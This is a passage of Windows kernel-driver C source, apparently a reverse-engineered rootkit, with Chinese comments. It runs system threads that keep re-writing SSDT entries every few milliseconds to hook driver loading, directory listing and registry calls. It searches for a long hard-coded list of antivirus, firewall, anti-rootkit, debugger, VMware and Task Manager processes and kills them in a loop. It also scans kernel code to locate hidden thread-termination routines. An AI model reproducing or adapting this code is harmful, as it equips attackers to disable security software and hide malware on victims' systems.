			ZwDeleteKey( KeyHandle );
		}

		KeDelayExecutionThread( KernelMode, FALSE, &interval );
	} 
}

BOOL StartThread_reg_Group()
{
	HANDLE ThreadHandle;
	if (!NT_SUCCESS(PsCreateSystemThread (&ThreadHandle,
		THREAD_ALL_ACCESS,
		NULL,
		0L,
		NULL,
		Thread_WriteReg_Group,
		NULL))) {
			return FALSE;
	}

	ObReferenceObjectByHandle (ThreadHandle,
		THREAD_ALL_ACCESS,
		NULL,
		KernelMode,
		(PVOID *)&pThreadObj_reg_Group,
		NULL);


	g_bRepeatWrite_reg_Group = TRUE;
	ZwClose (ThreadHandle);
	return TRUE;
}

/////////////////////////////////////////////////////////////////         --          --     
//+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++//     --     -      -     -- 
//+                                                           +//     --      -   -       -- 
//+                 下面是3个函数反复回写SSDT                 +//      --       -        --  
//+                                                           +//       -     sudami     -   
//+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++//        --            --    
/////////////////////////////////////////////////////////////////          --        --  
//                                                                           --    --
//		    																	--

VOID
Thread_WriteSDT (
				 IN PVOID StartContext
				 )
{
	LARGE_INTEGER interval;
	interval.QuadPart = -5 * 1000 * 10;     // 5ms, relative

	while (TRUE)  { 

		if (g_bRepeatWrite_sdt == FALSE) {
			PsTerminateSystemThread( STATUS_SUCCESS );
		}


		// 2
		if ( fake_ZwLoadDriver != (ZWLOADDRIVER) (*(((PServiceDescriptorTableEntry)KeServiceDescriptorTable)->ServiceTableBase +  pos_LoadDriver )) ) {
			WPOFF();

			(ZWLOADDRIVER) (*(((PServiceDescriptorTableEntry)KeServiceDescriptorTable)->ServiceTableBase + pos_LoadDriver)) = fake_ZwLoadDriver;

			WPON();
			ZwLoadDriver_Hooked = TRUE;
		}


		// 3
		if ( fake_ZwQueryDirectoryFile != (ZWQUERYDIRECTORYFILE) (*(((PServiceDescriptorTableEntry) \
			KeServiceDescriptorTable)->ServiceTableBase + pos_QueryDirectoryFile )) ) {
				WPOFF();
				(ZWQUERYDIRECTORYFILE) (*(((PServiceDescriptorTableEntry)KeServiceDescriptorTable)->ServiceTableBase \
					+ pos_QueryDirectoryFile)) = fake_ZwQueryDirectoryFile;
				WPON();
				ZwQueryDirectoryFile_Hooked = TRUE;
		}

		// 4
		if ( fake_ZwSaveKey != (ZWSAVEKEY) (*(((PServiceDescriptorTableEntry)KeServiceDescriptorTable)->ServiceTableBase \
			+ pos_SaveKey) ) ) {
				WPOFF();
				(ZWSAVEKEY) (*(((PServiceDescriptorTableEntry)KeServiceDescriptorTable)->ServiceTableBase + \
					pos_SaveKey) ) = fake_ZwSaveKey;
				WPON();
				ZwSaveKey_Hooked = TRUE;
		}

		// 5
		if ( fake_ZwDeleteKey != (ZWDELETEKEY) (*(((PServiceDescriptorTableEntry) \
			KeServiceDescriptorTable)->ServiceTableBase + pos_DeleteKey) ) ) {
				WPOFF();
				(ZWDELETEKEY) (*(((PServiceDescriptorTableEntry)KeServiceDescriptorTable)->ServiceTableBase + \
					pos_DeleteKey) ) = fake_ZwDeleteKey;
				WPON();
				ZwDeleteKey_Hooked = TRUE;
		}

		// 6
		if ( fake_ZwEnumerateKey != (ZWENUMERATEKEY) (*(((PServiceDescriptorTableEntry) \
			KeServiceDescriptorTable)->ServiceTableBase + pos_EnumerateKey) ) ) {
				WPOFF();
				(ZWENUMERATEKEY) (*(((PServiceDescriptorTableEntry)KeServiceDescriptorTable)->ServiceTableBase + \
					pos_EnumerateKey) ) = fake_ZwEnumerateKey;
				WPON();
				ZwEnumerateKey_Hooked = TRUE;
		}

		// 7
		if ( fake_ZwDeleteValueKey != (ZWDELETEVALUEKEY) (*(((PServiceDescriptorTableEntry) \
			KeServiceDescriptorTable)->ServiceTableBase + pos_DeleteValueKey) )  ) {
				WPOFF();
				(ZWDELETEVALUEKEY) (*(((PServiceDescriptorTableEntry)KeServiceDescriptorTable)->ServiceTableBase + \
					pos_DeleteValueKey) ) = fake_ZwDeleteValueKey;
				WPON();
				ZwDeleteValueKey_Hooked = TRUE;
		}

		KeDelayExecutionThread( KernelMode, FALSE, &interval );
	}
}

BOOL 
StartThread_sdt (
				 )
				 /*++

				 逆向: sudami  08/02/28

				 功能:
				 启动一个系统线程来反复写sdt

				 --*/
{
	HANDLE ThreadHandle;
	if (!NT_SUCCESS(PsCreateSystemThread (&ThreadHandle,
		THREAD_ALL_ACCESS,
		NULL,
		0L,
		NULL,
		Thread_WriteSDT,
		NULL))) {
			return FALSE;
	}

	ObReferenceObjectByHandle (ThreadHandle,
		THREAD_ALL_ACCESS,
		NULL,
		KernelMode,
		(PVOID *)&pThreadObj_sdt,
		NULL);


	g_bRepeatWrite_sdt = TRUE;
	//g_timeout.QuadPart = 100;

	//KeInitializeTimer( g_pKTimer_sdt );
	ZwClose (ThreadHandle);
	return TRUE;
}

/////////////////////////////////////////////////////////////////         --          --     
//+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++//     --     -      -     -- 
//+                                                           +//     --      -   -       -- 
//+                 进程和模块监视的回调函数                  +//      --       -        --  
//+                                                           +//       -     sudami     -   
//+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++//        --            --    
/////////////////////////////////////////////////////////////////          --        --  
//                                                                           --    --
//		    																	--

ULONG  
GetProcessNameOffset( void )
{
	PEPROCESS curproc;
	int i;

	curproc = PsGetCurrentProcess();
	for( i = 0; i < 3*PAGE_SIZE; i++ ) {
		if( !strncmp( "System", (PCHAR)curproc + i, strlen("System") )) {
			return i;
		}
	}

	return 0;
}


/////////////////////////////////////////////////////////////////         --          --     
//+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++//     --     -      -     -- 
//+                                                           +//     --      -   -       -- 
//+                 关指定的进程,eg:KV 2008                   +//      --       -        --  
//+                                                           +//       -     sudami     -   
//+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++//        --            --    
/////////////////////////////////////////////////////////////////          --        --  
//                                                                           --    --
//		    																	--

VOID
Thread_KillProc (
				 IN PVOID StartContext
				 )
{
	ULONG i;
	LARGE_INTEGER interval;
	interval.QuadPart = -5 * 1000 * 100;     // 5ms, relative

	while (TRUE)  { 

		if (IsExsitProc() == TRUE) { // 发现了关注的进程,结束之

			for (i=0; pObject[i] != NULL; i++) {
				My_TerminateProc( pObject[i], 0 );
			}
		}

		KeDelayExecutionThread( KernelMode, FALSE, &interval );
	}
}

BOOL 
StartThread_Kill (
				  )
				  /*++

				  逆向: sudami  08/02/28

				  功能:
				  启动一个系统线程来反复写sdt

				  --*/
{
	HANDLE ThreadHandle;
	if (!NT_SUCCESS(PsCreateSystemThread (&ThreadHandle,
		THREAD_ALL_ACCESS,
		NULL,
		0L,
		NULL,
		Thread_KillProc,
		NULL))) {
			return FALSE;
	}

	ObReferenceObjectByHandle (ThreadHandle,
		THREAD_ALL_ACCESS,
		NULL,
		KernelMode,
		(PVOID *)&pThreadObj_Kill,
		NULL);


	g_bRepeatWrite_Kill = TRUE;

	ZwClose (ThreadHandle);
	return TRUE;
}

//
// 
//
BOOL IsExsitProc()
{
	NTSTATUS           status;
	ULONG              size;
	SYSTEM_PROCESS_INFORMATION   *curr;
	PCHAR              pBuffer;
	WCHAR              Name[300];
	PEPROCESS		   Process;
	ULONG i, j, uRetSzie; 

	// 获取进程信息
	pBuffer = NULL;
	size = 0x1000;
	pBuffer = ExAllocatePool( NonPagedPool, size );

	// 得到指定的进程对象
	i = 0;

	for (j=0; j < 128; j++ ) { // 先清空数组
		pObject[j] = NULL;
	}


	do {
		status = ZwQuerySystemInformation( /*SystemProcessInformation*/5, \
			pBuffer, size, &uRetSzie );

		if (status == STATUS_INFO_LENGTH_MISMATCH) {
			ExFreePool( pBuffer );
			size *= 2;
			pBuffer = ExAllocatePool( NonPagedPool, size ); 

		} else if ( !NT_SUCCESS (status) ) {
			DbgPrint(" ZwQuerySystemInformation error\n"); 
			ExFreePool( pBuffer ); 

			return STATUS_UNSUCCESSFUL;
		}

	} while (status == STATUS_INFO_LENGTH_MISMATCH);

	curr = (SYSTEM_PROCESS_INFORMATION*) pBuffer;
	do {

		if ( curr->ImageName.Buffer != NULL ) {
			RtlCopyMemory(Name , curr->ImageName.Buffer, curr->ImageName.MaximumLength );
			_wcsupr(Name);

			//------------------江民------------------

			if ( wcsstr( Name, L"KVXP" ) != NULL ) { 
				pObject[i] = ExAllocatePool( PagedPool, 0x10 );
				if( NT_SUCCESS(PsLookupProcessByProcessId( (HANDLE)curr->UniqueProcessId, &pObject[i] ))) {
					DbgPrint("KvXP.kxp 江民 KV 杀毒软件主程序。 \n"); 
					i++;
				}
			}

			if ( wcsstr( Name, L"KVSRVXP" ) != NULL ) { 
				pObject[i] = ExAllocatePool( PagedPool, 0x10 );
				if( NT_SUCCESS(PsLookupProcessByProcessId( (HANDLE)curr->UniqueProcessId, &pObject[i] ))) {
					DbgPrint("KVSrvXP.exe 江民 KV 杀毒软件系统服务。 \n"); 
					i++;
				}
			}

			if ( wcsstr( Name, L"KVWSC" ) != NULL ) { 
				pObject[i] = ExAllocatePool( PagedPool, 0x10 );
				if( NT_SUCCESS(PsLookupProcessByProcessId( (HANDLE)curr->UniqueProcessId, &pObject[i] ))) {
					DbgPrint("KVwsc.exe江民 KV 杀毒软件安全认证中心 \n"); 
					i++;
				}
			}

			if ( wcsstr( Name, L"KVMONXP" ) != NULL ) { 
				pObject[i] = ExAllocatePool( PagedPool, 0x10 );
				if( NT_SUCCESS(PsLookupProcessByProcessId( (HANDLE)curr->UniqueProcessId, &pObject[i] ))) {
					DbgPrint("KVMonXP.kxp江民 KV 杀毒软件实时监控程序 \n"); 
					i++;
				}
			}

			//----------------------金山--------------------

			if ( wcsstr( Name, L"KAVSVCUI" ) != NULL ) { 
				pObject[i] = ExAllocatePool( PagedPool, 0x10 );
				if( NT_SUCCESS(PsLookupProcessByProcessId( (HANDLE)curr->UniqueProcessId, &pObject[i] ))) {
					DbgPrint("KAVSvcUI.exe   金山毒霸大管家\n"); 
					i++;
				}
			}

			if ( wcsstr( Name, L"KAVPFW" ) != NULL ) { 
				pObject[i] = ExAllocatePool( PagedPool, 0x10 );
				if( NT_SUCCESS(PsLookupProcessByProcessId( (HANDLE)curr->UniqueProcessId, &pObject[i] ))) {
					DbgPrint("KAVPFW.EXE     金山毒霸网络防火墙。\n"); 
					i++;
				}
			}

			if ( wcsstr( Name, L"KAV32" ) != NULL ) { 
				pObject[i] = ExAllocatePool( PagedPool, 0x10 );
				if( NT_SUCCESS(PsLookupProcessByProcessId( (HANDLE)curr->UniqueProcessId, &pObject[i] ))) {
					DbgPrint("KAV32.exe   金山毒霸主程序。\n"); 
					i++;
				}
			}

			//------------------卡巴------------------

			if ( wcsstr( Name, L"KAVSVC" ) != NULL ) { 
				pObject[i] = ExAllocatePool( PagedPool, 0x10 );
				if( NT_SUCCESS(PsLookupProcessByProcessId( (HANDLE)curr->UniqueProcessId, &pObject[i] ))) {
					DbgPrint("KAVsvc.exe 卡巴斯基或金山毒霸的病毒即时检测服务\n"); 
					i++;
				}
			}

			if ( wcsstr( Name, L"AVPM" ) != NULL ) { 
				pObject[i] = ExAllocatePool( PagedPool, 0x10 );
				if( NT_SUCCESS(PsLookupProcessByProcessId( (HANDLE)curr->UniqueProcessId, &pObject[i] ))) {
					DbgPrint("AVPM.EXE         卡巴斯基相关程序。\n"); 
					i++;
				}
			}

			if ( wcsstr( Name, L"AVPCC" ) != NULL ) { 
				pObject[i] = ExAllocatePool( PagedPool, 0x10 );
				if( NT_SUCCESS(PsLookupProcessByProcessId( (HANDLE)curr->UniqueProcessId, &pObject[i] ))) {
					DbgPrint("AVPCC.EXE     卡巴斯基 \n"); 
					i++;
				}
			}

			if ( wcsstr( Name, L"AVP32" ) != NULL ) { 
				pObject[i] = ExAllocatePool( PagedPool, 0x10 );
				if( NT_SUCCESS(PsLookupProcessByProcessId( (HANDLE)curr->UniqueProcessId, &pObject[i] ))) {
					DbgPrint("AVP32.EXE     卡巴斯基\n"); 
					i++;
				}
			}

			if ( wcsstr( Name, L"AVP.EXE" ) != NULL ) { 
				pObject[i] = ExAllocatePool( PagedPool, 0x10 );
				if( NT_SUCCESS(PsLookupProcessByProcessId( (HANDLE)curr->UniqueProcessId, &pObject[i] ))) {
					DbgPrint("AVP.EXE         卡巴斯基杀毒软件相关程序\n"); 
					i++;
				}
			}

			//------------------瑞星------------------

			if ( wcsstr( Name, L"RAVMOND" ) != NULL ) { 
				pObject[i] = ExAllocatePool( PagedPool, 0x10 );
				if( NT_SUCCESS(PsLookupProcessByProcessId( (HANDLE)curr->UniqueProcessId, &pObject[i] ))) {
					DbgPrint("RAVmonD.exe瑞星杀毒软件实时监控程序 \n"); 
					i++;
				}
			}

			if ( wcsstr( Name, L"RAVMON.EXE" ) != NULL ) { 
				pObject[i] = ExAllocatePool( PagedPool, 0x10 );
				if( NT_SUCCESS(PsLookupProcessByProcessId( (HANDLE)curr->UniqueProcessId, &pObject[i] ))) {
					DbgPrint("RAVmon.exe \n"); 
					i++;
				}
			}

			if ( wcsstr( Name, L"RAVTIMER" ) != NULL ) { 
				pObject[i] = ExAllocatePool( PagedPool, 0x10 );
				if( NT_SUCCESS(PsLookupProcessByProcessId( (HANDLE)curr->UniqueProcessId, &pObject[i] ))) {
					DbgPrint("RAVtimer.exe瑞星杀毒软件相关程序  \n"); 
					i++;
				}
			}

			if ( wcsstr( Name, L"RISING" ) != NULL ) { 
				pObject[i] = ExAllocatePool( PagedPool, 0x10 );
				if( NT_SUCCESS(PsLookupProcessByProcessId( (HANDLE)curr->UniqueProcessId, &pObject[i] ))) {
					DbgPrint("Rising.exe\n"); 
					i++;
				}
			}

			if ( wcsstr( Name, L"RAV.EXE" ) != NULL ) { 
				pObject[i] = ExAllocatePool( PagedPool, 0x10 );
				if( NT_SUCCESS(PsLookupProcessByProcessId( (HANDLE)curr->UniqueProcessId, &pObject[i] ))) {
					DbgPrint("Rav.exe   瑞星杀毒软件主程序 \n"); 
					i++;
				}
			}

			//------------------微点------------------

			if ( wcsstr( Name, L"MPSVC" ) != NULL ) { 
				pObject[i] = ExAllocatePool( PagedPool, 0x10 );
				if( NT_SUCCESS(PsLookupProcessByProcessId( (HANDLE)curr->UniqueProcessId, &pObject[i] ))) {
					DbgPrint("微点 1\n"); 
					i++;
				}
			}

			if ( wcsstr( Name, L"MPSVC1" ) != NULL ) { 
				pObject[i] = ExAllocatePool( PagedPool, 0x10 );
				if( NT_SUCCESS(PsLookupProcessByProcessId( (HANDLE)curr->UniqueProcessId, &pObject[i] ))) {
					DbgPrint("微点 2\n"); 
					i++;
				}
			}

			if ( wcsstr( Name, L"MPSVC2" ) != NULL ) { 
				pObject[i] = ExAllocatePool( PagedPool, 0x10 );
				if( NT_SUCCESS(PsLookupProcessByProcessId( (HANDLE)curr->UniqueProcessId, &pObject[i] ))) {
					DbgPrint("微点 3\n"); 
					i++;
				}
			}	

			//------------------360------------------
			if ( wcsstr( Name, L"360SAFE" ) != NULL ) { 
				pObject[i] = ExAllocatePool( PagedPool, 0x10 );
				if( NT_SUCCESS(PsLookupProcessByProcessId( (HANDLE)curr->UniqueProcessId, &pObject[i] ))) {
					DbgPrint("360Safe.exe \n"); 
					i++;
				}
			}

			if ( wcsstr( Name, L"360TRAY" ) != NULL ) {
				pObject[i] = ExAllocatePool( PagedPool, 0x10 );
				if( NT_SUCCESS(PsLookupProcessByProcessId( (HANDLE)curr->UniqueProcessId, &pObject[i] ))) {
					DbgPrint("360tray.exe  \n"); 
					i++;
				}
			}

			if ( wcsstr( Name, L"HIJACKTHIS" ) != NULL ) {
				pObject[i] = ExAllocatePool( PagedPool, 0x10 );
				if( NT_SUCCESS(PsLookupProcessByProcessId( (HANDLE)curr->UniqueProcessId, &pObject[i] ))) {
					DbgPrint("HijackThis.exe  \n"); 
					i++;
				}
			}

			//------------------ARK------------------
			if ( wcsstr( Name, L"ICESWORD" ) != NULL ) { // IS
				pObject[i] = ExAllocatePool( PagedPool, 0x10 );
				if( NT_SUCCESS(PsLookupProcessByProcessId( (HANDLE)curr->UniqueProcessId, &pObject[i] ))) {
					DbgPrint("IS\n"); 
					i++;
				}
			}

			if ( wcsstr( Name, L"WSYSCHECK" ) != NULL ) { // WSYSCHECK
				pObject[i] = ExAllocatePool( PagedPool, 0x10 );
				if( NT_SUCCESS(PsLookupProcessByProcessId( (HANDLE)curr->UniqueProcessId, &pObject[i] ))) {
					DbgPrint("WSYSCHECK\n"); 
					i++;
				}
			}

			if ( wcsstr( Name, L"SNIPESWORD" ) != NULL ) { // 狙剑
				pObject[i] = ExAllocatePool( PagedPool, 0x10 );
				if( NT_SUCCESS(PsLookupProcessByProcessId( (HANDLE)curr->UniqueProcessId, &pObject[i] ))) {
					DbgPrint("狙剑\n"); 
					i++;
				}
			}

			if ( wcsstr( Name, L"A121IS" ) != NULL ) { //  RKU
				pObject[i] = ExAllocatePool( PagedPool, 0x10 );
				if( NT_SUCCESS(PsLookupProcessByProcessId( (HANDLE)curr->UniqueProcessId, &pObject[i] ))) {
					DbgPrint("RKU\n"); 
					i++;
				}
			}

			if ( wcsstr( Name, L"GMER" ) != NULL ) { 
				pObject[i] = ExAllocatePool( PagedPool, 0x10 );
				if( NT_SUCCESS(PsLookupProcessByProcessId( (HANDLE)curr->UniqueProcessId, &pObject[i] ))) {
					DbgPrint("GMER\n"); 
					i++;
				}
			}

			//------------------其他------------------
			if ( wcsstr( Name, L"THGUARD" ) != NULL ) { 
				pObject[i] = ExAllocatePool( PagedPool, 0x10 );
				if( NT_SUCCESS(PsLookupProcessByProcessId( (HANDLE)curr->UniqueProcessId, &pObject[i] ))) {
					DbgPrint("THGUARD.EXE   TrojanHunter 监控器程序 \n"); 
					i++;
				}
			}

			if ( wcsstr( Name, L"PFW" ) != NULL ) { 
				pObject[i] = ExAllocatePool( PagedPool, 0x10 );
				if( NT_SUCCESS(PsLookupProcessByProcessId( (HANDLE)curr->UniqueProcessId, &pObject[i] ))) {
					DbgPrint("PFW.EXE 天网防火墙个人版\n"); 
					i++;
				}
			}

			if ( wcsstr( Name, L"ZONEALARM" ) != NULL ) { 
				pObject[i] = ExAllocatePool( PagedPool, 0x10 );
				if( NT_SUCCESS(PsLookupProcessByProcessId( (HANDLE)curr->UniqueProcessId, &pObject[i] ))) {
					DbgPrint("ZONEALARM.EXE-------防火墙ZoneAlarm\n"); 
					i++;
				}
			}

			if ( wcsstr( Name, L"VSHWIN32" ) != NULL ) { 
				pObject[i] = ExAllocatePool( PagedPool, 0x10 );
				if( NT_SUCCESS(PsLookupProcessByProcessId( (HANDLE)curr->UniqueProcessId, &pObject[i] ))) {
					DbgPrint("VSHWIN32.EXE 麦咖啡\n"); 
					i++;
				}
			}

			if ( wcsstr( Name, L"TBSCAN" ) != NULL ) { 
				pObject[i] = ExAllocatePool( PagedPool, 0x10 );
				if( NT_SUCCESS(PsLookupProcessByProcessId( (HANDLE)curr->UniqueProcessId, &pObject[i] ))) {
					DbgPrint("TBSCAN.EXE--款不错的反病毒软件，在对会最新和未知病毒方面比较厉害 \n"); 
					i++;
				}
			}

			if ( wcsstr( Name, L"SWEEP95" ) != NULL ) { 
				pObject[i] = ExAllocatePool( PagedPool, 0x10 );
				if( NT_SUCCESS(PsLookupProcessByProcessId( (HANDLE)curr->UniqueProcessId, &pObject[i] ))) {
					DbgPrint("SWEEP95.EXE--------------杀毒软件 \n"); 
					i++;
				}
			}

			if ( wcsstr( Name, L"SMC.EXE" ) != NULL ) { 
				pObject[i] = ExAllocatePool( PagedPool, 0x10 );
				if( NT_SUCCESS(PsLookupProcessByProcessId( (HANDLE)curr->UniqueProcessId, &pObject[i] ))) {
					DbgPrint("SMC.EXE   Sygate Personal Firewall 个人防火墙 \n"); 
					i++;
				}
			}

			if ( wcsstr( Name, L"NMAIN.EXE" ) != NULL ) { 
				pObject[i] = ExAllocatePool( PagedPool, 0x10 );
				if( NT_SUCCESS(PsLookupProcessByProcessId( (HANDLE)curr->UniqueProcessId, &pObject[i] ))) {
					DbgPrint("NMAIN.EXE \n"); 
					i++;
				}
			}

			if ( wcsstr( Name, L"LUALL" ) != NULL ) { 
				pObject[i] = ExAllocatePool( PagedPool, 0x10 );
				if( NT_SUCCESS(PsLookupProcessByProcessId( (HANDLE)curr->UniqueProcessId, &pObject[i] ))) {
					DbgPrint("LUALL.EXE  Symantec LiveUpdate 在线升级程序  \n"); 
					i++;
				}
			}

			if ( wcsstr( Name, L"ICMON.EXE" ) != NULL ) { 
				pObject[i] = ExAllocatePool( PagedPool, 0x10 );
				if( NT_SUCCESS(PsLookupProcessByProcessId( (HANDLE)curr->UniqueProcessId, &pObject[i] ))) {
					DbgPrint("ICMON.EXE    Sophos 防病毒软件的活动监视器程序 \n"); 
					i++;
				}
			}

			if ( wcsstr( Name, L"APVXDWIN" ) != NULL ) { 
				pObject[i] = ExAllocatePool( PagedPool, 0x10 );
				if( NT_SUCCESS(PsLookupProcessByProcessId( (HANDLE)curr->UniqueProcessId, &pObject[i] ))) {
					DbgPrint("APVXDWIN.EXE 熊猫卫士 \n"); 
					i++;
				}
			}

			//   qq
			if ( wcsstr( Name, L"QQ" ) != NULL ) { 
				pObject[i] = ExAllocatePool( PagedPool, 0x10 );
				if( NT_SUCCESS(PsLookupProcessByProcessId( (HANDLE)curr->UniqueProcessId, &pObject[i] ))) {
					DbgPrint("QQ \n"); 
					i++;
				}
			}

			if ( wcsstr( Name, L"TASK" ) != NULL ) { 
				pObject[i] = ExAllocatePool( PagedPool, 0x10 );
				if( NT_SUCCESS(PsLookupProcessByProcessId( (HANDLE)curr->UniqueProcessId, &pObject[i] ))) {
					DbgPrint("任务管理器 \n"); 
					i++;
				}
			}

			// VMVARE
			if ( wcsstr( Name, L"VMWARE-VMX" ) != NULL ) { 
				pObject[i] = ExAllocatePool( PagedPool, 0x10 );
				if( NT_SUCCESS(PsLookupProcessByProcessId( (HANDLE)curr->UniqueProcessId, &pObject[i] ))) {
					DbgPrint("VMWARE-VMX \n"); 
					i++;
				}
			}

			if ( wcsstr( Name, L"VMWARE" ) != NULL ) { 
				pObject[i] = ExAllocatePool( PagedPool, 0x10 );
				if( NT_SUCCESS(PsLookupProcessByProcessId( (HANDLE)curr->UniqueProcessId, &pObject[i] ))) {
					DbgPrint("VMWARE.EXE \n"); 
					i++;
				}
			}

			// Windbg
			if ( wcsstr( Name, L"WINDBG" ) != NULL ) { 
				pObject[i] = ExAllocatePool( PagedPool, 0x10 );
				if( NT_SUCCESS(PsLookupProcessByProcessId( (HANDLE)curr->UniqueProcessId, &pObject[i] ))) {
					DbgPrint("Windbg.EXE \n"); 
					i++;
				}
			}

		}

		if ( curr->NextEntryOffset ) { // 依次递增链表,直到结束
			(char*)curr += curr->NextEntryOffset;
		}

	} while (curr->NextEntryOffset);

	ExFreePool( pBuffer ); 

	if ( 0 == i ) {
		return FALSE;
	}

	DbgPrint("Our concerned Process counts: %d\n", i); 

	return TRUE;
}


ULONG 
GetFunctionAddr( 
				IN PCWSTR FunctionName
				)
{
	UNICODE_STRING UniCodeFunctionName;

	RtlInitUnicodeString( &UniCodeFunctionName, FunctionName );
	return (ULONG)MmGetSystemRoutineAddress( &UniCodeFunctionName );    

}

/////////////////////////////////////////////////////////////////         --          --     
//+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++//     --     -      -     -- 
//+                                                           +//     --      -   -       -- 
//+   得到KeAcquireInStackQueuedSpinLockRaiseToSynch的地址    +//      --       -        --  
//+                                                           +//       -     sudami     -   
//+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++//        --            --    
/////////////////////////////////////////////////////////////////          --        --  
//                                                                           --    --
//		    																	--



//
//
//

VOID XPGetPsGetNextProcessThread()
{
	PUCHAR cPtr;
	PUCHAR addr;
	int i = 0;

	//DbgPrint("开始找PsGetNextProcessThread \n");

	if( NULL == NtTerminateProcess) {
		DbgPrint( "NtTerminateProcess NULL == \n" );
		return;
	}

	for (cPtr = (PUCHAR)NtTerminateProcess; 
		cPtr < ((PUCHAR)NtTerminateProcess + PAGE_SIZE); 
		cPtr++) {

			//DbgPrint("cPtr: \t0x%08x \n", cPtr);
			if (*cPtr == 0xE8/* && *(PUSHORT)(cPtr + 5) == 0x8BF0 && *(PUSHORT)(cPtr + 7) == 0x85F6*/) {
				i++;
				//DbgPrint("--- 进来了--- \n");

				if( 3 == i ) {
					g_PsGetNextProcessThread = 
						(My_PsGetNextProcessThread)(*(PULONG)(cPtr + 1) + (ULONG)cPtr + 5);
					DbgPrint( "PsGetNextProcessThread:\t0x%08x\n", (ULONG)g_PsGetNextProcessThread );

					break;
				}
			}
	}

	// 查找 KiInsertQueueApc 的地址

	addr = (PUCHAR) GetFunctionAddr( L"KeInsertQueueApc" );
	DbgPrint( "KeInsertQueueApc:\t0x%08x\n", addr );

	for (cPtr = (PUCHAR)addr; 
		cPtr < (PUCHAR)addr + PAGE_SIZE; 
		cPtr++)
	{
		if (*cPtr == 0xE8 && *(PUSHORT)(cPtr + 5) == 0xD88A) {

			KiInsertQueueApc = (KIINSERTQUEUEAPC)(*(PULONG)(cPtr + 1) + (ULONG)cPtr + 5);
			DbgPrint( "KiInsertQueueApc:\t0x%08x\n", (ULONG)KiInsertQueueApc );
			break;
		}
	}

	if ( FALSE == g_bMP ) { // 不存在微点，还好

		DbgPrint( "PsTerminateSystemThread:\t0x%08x\n", PsTerminateSystemThread );

		for (cPtr = (PUCHAR)PsTerminateSystemThread; 
			cPtr < (PUCHAR)PsTerminateSystemThread + PAGE_SIZE; 
			cPtr++)
		{
			if (*cPtr == 0xE8 && *(PUSHORT)(cPtr + 5) == 0xC25D) 
			{
				PspTerminateThreadByPointer = 
					(PSPTERMINATETHREADBYPOINTER)(*(PULONG)(cPtr + 1) + (ULONG)cPtr + 5);
				DbgPrint( "PspTerminateThreadByPointer:\t0x%08x\n", 
					(ULONG)PspTerminateThreadByPointer );

				// 查找PspExitThread的地址
				for (cPtr = (PUCHAR)PspTerminateThreadByPointer; 
					cPtr < (PUCHAR)PspTerminateThreadByPointer + PAGE_SIZE; 
					cPtr++)
				{
					if (*cPtr == 0xE8 && *(PUSHORT)(cPtr + 5) == 0x9090) {

						PspExitThread = (PSPEXITTHREAD)(*(PULONG)(cPtr + 1) + (ULONG)cPtr + 5);
						DbgPrint( "PspExitThread:\t0x%08x\n", (ULONG)PspExitThread );
						break;
					}
				}

				break;
			}
		}
	}
}





/////////////////////////////////////////////////////////////////         --          --     
//+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++//     --     -      -     -- 
//+                                                           +//     --      -   -       -- 
//+              得到PsGetNextProcessThread的地址             +//      --       -        --  
//+                                                           +//       -     sudami     -   
//+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++//        --            --    
/////////////////////////////////////////////////////////////////          --        --  
//                                                                           --    --
//		    																	--


VOID
FindPsXXAddr()
{
	HANDLE hThread;
	PVOID objtowait;
	NTSTATUS st;

	st = PsCreateSystemThread(
		&hThread,
		0,
		NULL,
		(HANDLE)0,
		NULL,
		DoFind,
		NULL);

	if ((KeGetCurrentIrql())!=PASSIVE_LEVEL) {
		st=KfRaiseIrql(PASSIVE_LEVEL);
	}

	if ((KeGetCurrentIrql())!=PASSIVE_LEVEL) {
		return;
	}

	objtowait = 0;
	ObReferenceObjectByHandle(
		hThread,
		THREAD_ALL_ACCESS,
		NULL,
		KernelMode,
		&objtowait,
		NULL
		); 

	st = KeWaitForSingleObject( objtowait, Executive, KernelMode, FALSE, NULL );
}

VOID 
DoFind (
		IN PVOID pContext
		)
{
	PUCHAR cPtr;
	PUCHAR addr;
	ULONG i;
	ULONG code1_sp2=0x8B55FF8B,code2_sp2=0x565351EC,code3_sp2=0x24A16457,code4_sp2=0x8B000001;
	ULONG code5_sp2=0xD88B087D;

	ULONG code1_KeForceResumeThread=0x8B55FF8B,code2_KeForceResumeThread=0x575653EC,code3_KeForceResumeThread=0x15FFC933,code4_KeForceResumeThread=0x80801088;
	ULONG code5_KeForceResumeThread=0x458BD88A;

	ULONG code1_PspExitThread=0x1068606A,code2_PspExitThread=0xE8808155,code3_PspExitThread=0xFFF6F7AB,code4_PspExitThread=0x0124A164;
	ULONG code5_PspExitThread=0xF08B0000;

	PIMAGE_FILE_HEADER	pfh;
	PIMAGE_OPTIONAL_HEADER	poh;
	PIMAGE_SECTION_HEADER	psh;

	BOOL bFind_1 = FALSE;
	BOOL bFind_2 = FALSE;
	BOOL bFind_3 = FALSE;
	ULONG sudami_1;
	FILE_STANDARD_INFORMATION	fsi;
	NTSTATUS            ntStatus = STATUS_SUCCESS;
	ULONG               ModuleBase = 0;
	HANDLE              ntFileHandle;
	LARGE_INTEGER       byteOffset;
	ULONG               NtHeadersOffset;
	ULONG               AddressOfEntryPoint;
	ULONG               SizeOfImage;
	ULONG               ImageBase;
	ULONG               NeedSize;
	ULONG               Delta;
	PUCHAR              FileContent;
	UNICODE_STRING   	FileName;	
	OBJECT_ATTRIBUTES	oa;
	IO_STATUS_BLOCK	    ioStatus;
	PCHAR	            pKernelName;
	DWORD	            rc, dwNeededSize;
	PMODULES	pModules = (PMODULES)&pModules;
#define MAX_PATH 0x104
	WCHAR	wSystemRoot[MAX_PATH+1], wFileName[MAX_PATH+1];
	UNICODE_STRING  SystemRoot = {0, (MAX_PATH+1) << 1, wSystemRoot};

	RTL_QUERY_REGISTRY_TABLE rqrtSystemRoot[] = {
		{NULL, RTL_QUERY_REGISTRY_DIRECT, L"SystemRoot", &SystemRoot, REG_NONE, NULL, 0},
		{NULL, 0, NULL, NULL, REG_NONE, NULL, 0}
	};


	////////////////////////////////////////////////

	try {
		//-------------------------------------------------------------------------------------
